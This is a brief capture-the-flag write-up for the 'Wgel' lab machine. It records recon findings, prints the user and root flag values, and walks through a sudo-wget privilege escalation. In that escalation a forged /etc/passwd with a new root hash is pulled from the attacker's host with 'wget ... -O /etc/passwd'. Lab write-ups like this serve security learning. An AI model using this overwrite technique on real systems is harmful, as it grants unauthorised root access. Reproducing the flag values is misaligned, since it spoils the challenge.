# WGEL CTF

## BASIC INFO
```
export IP=10.10.18.17
```

Found possible username on main page.`Jessie`\
Found `sitemap` from gobuster.\
Found `.ssh` on `sitemap` with dirb\

> - **User flag**
>> 057c67131c3d5e42dd5cd3075b198ff6

> - **Root flag**
>> b1b968b37519ad1daa6408188649263d

Running `sudo -l` we found out that we can run `wget`.\
`cat /etc/passwd` and copy it to our host machine. Using python3 crypt library to hash the password that we choosen and modify passwd locally.
```python
python3
import crypt
crypt.crypt("hi")
```
Then copy the hash and replace the `x` in `root:x:0:0:root:/root:/bin/bash` with the hash.\
Now fire up a server on our local machine with `python3 -m http.server`\
On the remote machine run the command `wget http://host_ip:8000/passwd -O /etc/passwd` and this should overwrite the passwd.\
Next just run `su` and enter password that we choose just now.